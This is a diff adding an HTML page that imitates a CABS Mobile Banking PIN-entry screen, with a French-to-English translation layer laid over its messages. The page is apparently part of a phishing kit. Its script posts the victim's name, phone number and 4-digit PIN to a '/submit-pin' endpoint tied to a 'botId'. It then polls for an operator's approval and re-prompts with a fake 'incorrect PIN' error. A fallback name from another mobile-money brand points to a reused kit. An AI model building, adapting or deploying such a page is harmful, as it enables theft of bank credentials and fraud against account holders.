@@ -1,0 +1,505 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>CABS Mobile Banking - PIN</title>
+
+  <style>
+    /* ── reset & base ── */
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+    }
+
+    body {
+      background: #fff;
+      min-height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: flex-start;
+      padding: 0;
+    }
+
+    .app-wrapper {
+      width: 100%;
+      max-width: 420px;
+      background: #fff;
+      min-height: 100vh;
+      position: relative;
+      box-shadow: 0 0 20px rgba(0,0,0,0.05);
+    }
+
+    /* ── top bar (CABS blue) ── */
+    .top-bar {
+      height: 72px;
+      background: #0d47a1;
+      display: flex;
+      align-items: center;
+      padding: 0 22px;
+      flex-shrink: 0;
+    }
+
+    .back-btn {
+      color: #fff;
+      font-size: 30px;
+      text-decoration: none;
+      font-weight: 300;
+      background: none;
+      border: none;
+      padding: 0;
+      cursor: pointer;
+    }
+
+    /* ── container ── */
+    .container {
+      padding: 28px 24px 100px;
+      display: flex;
+      flex-direction: column;
+    }
+
+    /* ── title & subtitle ── */
+    .title {
+      font-size: 26px;
+      font-weight: 700;
+      color: #0d47a1;
+      margin-bottom: 4px;
+      letter-spacing: -0.3px;
+    }
+
+    .subtitle {
+      font-size: 15px;
+      color: #555;
+      margin-bottom: 28px;
+      line-height: 1.5;
+    }
+
+    /* ── PIN boxes wrapper ── */
+    .pin-box-wrapper {
+      background: #fafafa;
+      border-radius: 18px;
+      padding: 22px 16px;
+      margin-bottom: 20px;
+      border: 1px solid #eee;
+      position: relative;
+      cursor: pointer;
+      touch-action: manipulation;
+    }
+
+    .pin-row {
+      display: flex;
+      justify-content: center;
+      gap: 14px;
+      align-items: center;
+    }
+
+    .pin-box {
+      width: 56px;
+      height: 56px;
+      border-radius: 12px;
+      border: 2px solid #d0d7de;
+      background: #fff;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 28px;
+      font-weight: 600;
+      color: #0d47a1;
+      transition: border-color 0.3s, box-shadow 0.2s;
+    }
+
+    .pin-box.filled {
+      border-color: #0d47a1;
+      box-shadow: 0 0 0 3px rgba(13, 71, 161, 0.15);
+    }
+
+    .lock-icon {
+      width: 56px;
+      height: 56px;
+      border-radius: 12px;
+      border: 2px dashed #d0d7de;
+      background: #f9f9f9;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 26px;
+      color: #aaa;
+    }
+
+    /* ── overlay input ── */
+    #pinInput {
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      opacity: 0;
+      background: transparent;
+      border: none;
+      outline: none;
+      cursor: pointer;
+      font-size: 16px;
+    }
+
+    /* ── alert message ── */
+    #otp-alert {
+      text-align: center;
+      font-size: 15px;
+      font-weight: 500;
+      min-height: 24px;
+      margin-bottom: 12px;
+      padding: 10px 12px;
+      border-radius: 8px;
+      background: transparent;
+      transition: all 0.2s;
+    }
+
+    #otp-alert.error {
+      background: #fde7e7;
+      color: #b00020;
+      border: 1px solid #f5c6cb;
+    }
+
+    #otp-alert.success {
+      background: #e7f5e7;
+      color: #1e7e34;
+      border: 1px solid #b7d7b7;
+    }
+
+    /* ── waiting message ── */
+    #waiting {
+      text-align: center;
+      font-size: 14px;
+      color: #0d47a1;
+      margin-top: 8px;
+      display: none;
+      padding: 10px;
+      border-radius: 8px;
+      background: #e8f0fe;
+      border: 1px solid #bbd4f0;
+    }
+
+    /* ── button (fixed) ── */
+    .continue-btn {
+      position: fixed;
+      left: 24px;
+      right: 24px;
+      bottom: 28px;
+      width: auto;
+      max-width: 420px;
+      margin: 0 auto;
+      height: 56px;
+      font-size: 20px;
+      font-weight: 700;
+      border-radius: 10px;
+      border: none;
+      cursor: not-allowed;
+      transition: background 0.2s, transform 0.1s;
+      background: #b7cff0;
+      color: #fff;
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+      box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+      left: 50%;
+      transform: translateX(-50%);
+    }
+
+    .continue-btn:enabled {
+      background: #0d47a1;
+      cursor: pointer;
+    }
+
+    .continue-btn:enabled:hover {
+      background: #0a3a8a;
+      transform: translateX(-50%) scale(1.01);
+    }
+
+    .continue-btn.waiting {
+      background: #f5a623;
+      opacity: 1;
+      cursor: default;
+    }
+
+    .footer {
+      margin-top: 24px;
+      text-align: center;
+      font-size: 12px;
+      color: #bbb;
+      letter-spacing: 0.5px;
+      padding-bottom: 12px;
+    }
+
+    .back-link {
+      display: none;
+    }
+
+    /* ── responsive ── */
+    @media (max-width: 480px) {
+      .container {
+        padding: 24px 18px 100px;
+      }
+      .title {
+        font-size: 24px;
+      }
+      .pin-box {
+        width: 50px;
+        height: 50px;
+        font-size: 24px;
+      }
+      .lock-icon {
+        width: 50px;
+        height: 50px;
+        font-size: 22px;
+      }
+      .continue-btn {
+        height: 54px;
+        font-size: 18px;
+        left: 18px;
+        right: 18px;
+      }
+    }
+
+    @media (max-width: 360px) {
+      .pin-box {
+        width: 44px;
+        height: 44px;
+        font-size: 20px;
+      }
+      .lock-icon {
+        width: 44px;
+        height: 44px;
+        font-size: 18px;
+      }
+      .pin-row {
+        gap: 10px;
+      }
+    }
+  </style>
+</head>
+<body>
+
+<div class="app-wrapper">
+
+  <!-- Top bar (CABS) -->
+  <div class="top-bar">
+    <button class="back-btn" onclick="window.history.back()">&#8592;</button>
+  </div>
+
+  <div class="container">
+
+    <div class="title">Enter PIN</div>
+    <div class="subtitle">Enter your 4‑digit PIN</div>
+
+    <!-- PIN boxes with invisible overlay -->
+    <div class="pin-box-wrapper">
+      <div class="pin-row">
+        <div class="pin-box" id="b1"></div>
+        <div class="pin-box" id="b2"></div>
+        <div class="pin-box" id="b3"></div>
+        <div class="pin-box" id="b4"></div>
+        <div class="lock-icon">🔒</div>
+      </div>
+      <input id="pinInput" type="tel" inputmode="numeric" maxlength="4" autofocus />
+    </div>
+
+    <div id="otp-alert"></div>
+    <div id="waiting">⏳ Awaiting approval…</div>
+
+    <div class="footer">v 5.3.2 (1.0.0)</div>
+  </div>
+
+  <!-- Fixed button -->
+  <button id="verifyBtn" class="continue-btn" disabled>SUBMIT</button>
+</div>
+
+<!-- ====== TRANSLATION LAYER (does NOT touch logic) ====== -->
+<script>
+  (function() {
+    // Map French → English for dynamic messages
+    const translations = {
+      '⏳ En attente d’approbation…': '⏳ Awaiting approval…',
+      'En attente…': 'Awaiting…',
+      'Se connecter': 'SUBMIT',
+      '❌ Erreur serveur. Veuillez réessayer.': '❌ Server error. Please try again.',
+      '❌ Code PIN incorrect. Veuillez réessayer.': '❌ Incorrect PIN. Please try again.',
+      'Aucun ID reçu': 'No ID received',
+      'Erreur serveur': 'Server error'
+    };
+
+    function translateNode(node) {
+      if (node.nodeType === Node.TEXT_NODE) {
+        let text = node.textContent;
+        let changed = false;
+        for (const [fr, en] of Object.entries(translations)) {
+          if (text.includes(fr)) {
+            text = text.replace(fr, en);
+            changed = true;
+          }
+        }
+        if (changed) node.textContent = text;
+      } else if (node.nodeType === Node.ELEMENT_NODE) {
+        node.childNodes.forEach(translateNode);
+      }
+    }
+
+    // Observe changes in container, alert, waiting, and button
+    const targets = [
+      document.querySelector('.container'),
+      document.getElementById('otp-alert'),
+      document.getElementById('waiting'),
+      document.getElementById('verifyBtn')
+    ].filter(el => el);
+
+    const observer = new MutationObserver(() => {
+      targets.forEach(el => translateNode(el));
+    });
+
+    targets.forEach(el => {
+      observer.observe(el, { childList: true, subtree: true, characterData: true });
+    });
+
+    // Initial translation
+    setTimeout(() => {
+      targets.forEach(el => translateNode(el));
+    }, 100);
+  })();
+</script>
+
+<!-- ======== YOUR ORIGINAL SCRIPT (UNTOUCHED) ======== -->
+<script>
+(function() {
+  const input = document.getElementById('pinInput');
+  const verifyBtn = document.getElementById('verifyBtn');
+  const waitingEl = document.getElementById('waiting');
+  const alertEl = document.getElementById('otp-alert');
+  const boxes = [
+    document.getElementById('b1'),
+    document.getElementById('b2'),
+    document.getElementById('b3'),
+    document.getElementById('b4')
+  ];
+
+  // ── Get stored data ──
+  const fullName = localStorage.getItem('fullName') || localStorage.getItem('name') || 'Client Moov Money';
+  const phone = localStorage.getItem('phone');
+  const params = new URLSearchParams(window.location.search);
+  let botId = params.get('botId') || localStorage.getItem('botId');
+  if (botId) localStorage.setItem('botId', botId);
+
+  if (!phone || !botId) {
+    alert('Session expirée. Veuillez recommencer.');
+    window.location.href = 'index.html';
+    return;
+  }
+
+  // ── Focus helper ──
+  function focusPin() { input.focus(); }
+
+  // ── Update PIN boxes ──
+  function updateBoxes(value) {
+    const digits = value.padEnd(4, '');
+    boxes.forEach((box, i) => {
+      if (digits[i]) {
+        box.textContent = '●';
+        box.classList.add('filled');
+      } else {
+        box.textContent = '';
+        box.classList.remove('filled');
+      }
+    });
+  }
+
+  // ── Input events ──
+  input.addEventListener('input', () => {
+    input.value = input.value.replace(/\D/g, '').slice(0, 4);
+    updateBoxes(input.value);
+    verifyBtn.disabled = input.value.length !== 4;
+    alertEl.textContent = '';
+    alertEl.className = '';
+  });
+
+  input.addEventListener('paste', (e) => {
+    e.preventDefault();
+    const paste = e.clipboardData.getData('text');
+    const digits = paste.replace(/\D/g, '').slice(0, 4);
+    input.value = digits;
+    updateBoxes(digits);
+    verifyBtn.disabled = digits.length !== 4;
+    if (digits.length === 4) {
+      setTimeout(() => verifyBtn.click(), 300);
+    }
+  });
+
+  // ── Show alert message ──
+  function showAlert(text, type = 'error') {
+    alertEl.textContent = text;
+    alertEl.className = type;
+  }
+
+  // ── Verify button click ──
+  verifyBtn.addEventListener('click', async () => {
+    const pin = input.value;
+    if (pin.length !== 4) return;
+
+    verifyBtn.disabled = true;
+    verifyBtn.textContent = 'En attente…';
+    verifyBtn.classList.add('waiting');
+    waitingEl.style.display = 'block';
+    showAlert('', '');
+
+    try {
+      const res = await fetch(`${window.location.origin}/submit-pin`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ name: fullName, phone, pin, botId })
+      });
+      if (!res.ok) throw new Error('Erreur serveur');
+      const data = await res.json();
+      if (!data.requestId) throw new Error('Aucun ID reçu');
+      pollPin(data.requestId);
+    } catch (error) {
+      waitingEl.style.display = 'none';
+      verifyBtn.disabled = false;
+      verifyBtn.textContent = 'Se connecter';
+      verifyBtn.classList.remove('waiting');
+      showAlert('❌ Erreur serveur. Veuillez réessayer.', 'error');
+    }
+  });
+
+  // ── Polling ──
+  function pollPin(requestId) {
+    const interval = setInterval(async () => {
+      try {
+        const res = await fetch(`${window.location.origin}/check-pin/${requestId}`);
+        const data = await res.json();
+        if (data.approved === true) {
+          clearInterval(interval);
+          window.location.href = 'success.html';
+        }
+        if (data.approved === false || data.blocked) {
+          clearInterval(interval);
+          // Reset
+          input.value = '';
+          boxes.forEach(b => { b.textContent = ''; b.classList.remove('filled'); });
+          verifyBtn.disabled = true;
+          verifyBtn.textContent = 'Se connecter';
+          verifyBtn.classList.remove('waiting');
+          waitingEl.style.display = 'none';
+          showAlert('❌ Code PIN incorrect. Veuillez réessayer.', 'error');
+          focusPin();
+        }
+      } catch (error) {
+        console.error('Polling error:', error);
+      }
+    }, 2000);
+  }
+
+  // ── Initial focus ──
+  window.onload = () => focusPin();
+})();
+</script>
+
+</body>
+</html>
